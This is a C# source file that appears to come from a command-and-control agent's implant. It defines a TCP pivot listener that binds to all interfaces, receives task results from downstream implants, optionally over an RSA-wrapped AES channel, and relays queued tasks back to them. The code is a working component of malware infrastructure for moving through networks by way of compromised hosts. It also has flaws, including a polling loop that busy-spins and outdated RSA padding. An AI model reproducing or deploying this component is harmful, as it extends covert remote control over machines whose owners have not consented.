using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotTCPServer
    {
        private readonly int _bindPort;
        private readonly IPAddress _bindAddress;
        private readonly bool _isSecure;

        private IMessageService _messageService;

        public string Type
        {
            get
            {
                if (_isSecure)
                    return "tcps";
                else
                    return "tcp";
            }
        }

        public int Port
        {
            get
            {
                return _bindPort;
            }
        }

        public PivotTCPServer(int bindPort, bool isSecure = true, IPAddress bindAddress = null)
        {
            _bindPort = bindPort;
            _bindAddress = bindAddress ?? IPAddress.Any;
            _isSecure = isSecure;
            _messageService = ServiceProvider.GetService<IMessageService>();
        }

        private readonly CancellationTokenSource _tokenSource = new CancellationTokenSource();

        public async Task Start()
        {
            var listener = new TcpListener(_bindAddress, _bindPort);
            listener.Start(100);

            while (!_tokenSource.IsCancellationRequested)
            {
                // this blocks until a connection is received or token is cancelled
                var client = await listener.AcceptTcpClientAsync(_tokenSource);

                // do something with the connected client
                var thread = new Thread(async () => await HandleClient(client));
                thread.Start();
            }
            // handle client in new thread

            listener.Stop();
        }

        private async Task HandleClient(TcpClient client)
        {
            if (client == null)
                return;

            var endpoint = (IPEndPoint)client.Client.RemoteEndPoint;
            var id = endpoint.Address + ":" + endpoint.Port;

            try
            {
                while (!_tokenSource.IsCancellationRequested && client.IsAlive())
                {

                    // read from client
                    if (!client.DataAvailable())
                        continue;

                    if (_isSecure)
                        HandleSecureClient(client);
                    else
                        HandleNonSecureClient(client);
                }

                // sos cpu
                await Task.Delay(10);
            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine(ex);
#endif
            }
            finally
            {
                Debug.WriteLine($"TCP Pivot {id} : disconnected");
            }
        }


        public void Stop()
        {
            _tokenSource.Cancel();
        }

        private void HandleNonSecureClient(TcpClient client)
        {
            var req = client.ReceivedMessage();
            //Convert.FromBase64String(b64results).Deserialize<List<MessageResult>>();
            var responses = req.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            List<string> relays = new List<string>();
            foreach (var mr in responses)
            {
                if (!relays.Contains(mr.Header.Owner))
                    relays.Add(mr.Header.Owner);
            }

            Debug.WriteLine($"TCP Pivot {this._bindAddress}:{this._bindPort} Sending task to Relays {string.Join(",", relays)}");
            var tasks = this._messageService.GetMessageTasksToRelay(relays);
            client.SendData(tasks.Serialize());
        }

        private void HandleSecureClient(TcpClient client)
        {
            //receive public key
            string xmlPubKey = Encoding.UTF8.GetString(client.ReceivedMessage(true));
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(xmlPubKey);

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256; // Set the key size to 256 bits
            rijndael.BlockSize = 128;
            rijndael.GenerateKey(); // Generate a random key
            rijndael.Padding = PaddingMode.PKCS7;

            //Send symetric Key & IV
            byte[] encryptedKey = rsa.Encrypt(rijndael.Key, false);
            //Debug.WriteLine("TCPS Pivot : EncryptedKey = " + string.Join(",", encryptedKey.Select(a => ((int)a).ToString())));
            client.SendData(encryptedKey);
            byte[] encryptedIV = rsa.Encrypt(rijndael.IV, false);
            //Debug.WriteLine("TCPS Pivot : EncryptedIV = " + string.Join(",", encryptedIV.Select(a => ((int)a).ToString())));
            client.SendData(encryptedIV);

            var req = client.ReceivedMessage(true);
            //Debug.WriteLine("TCPS Pivot : Encrypted Message (read " + req.Length + ") = " + string.Join(",", req.Select(a => ((int)a).ToString())));
            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(req, 0, req.Length);
            var responses = decryptedBytes.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            List<string> relays = new List<string>();
            foreach (var mr in responses)
            {
                if (!relays.Contains(mr.Header.Owner))
                    relays.Add(mr.Header.Owner);
            }

            Debug.WriteLine($"TCPS Pivot {this._bindAddress}:{this._bindPort} Sending task to Relays {string.Join(",", relays)}");
            var tasks = this._messageService.GetMessageTasksToRelay(relays);

            var meesage = tasks.Serialize();
            var encryptedMessageBytes = rijndael.CreateEncryptor().TransformFinalBlock(meesage, 0, meesage.Length);
            client.SendData(encryptedMessageBytes);
        }
    }
}
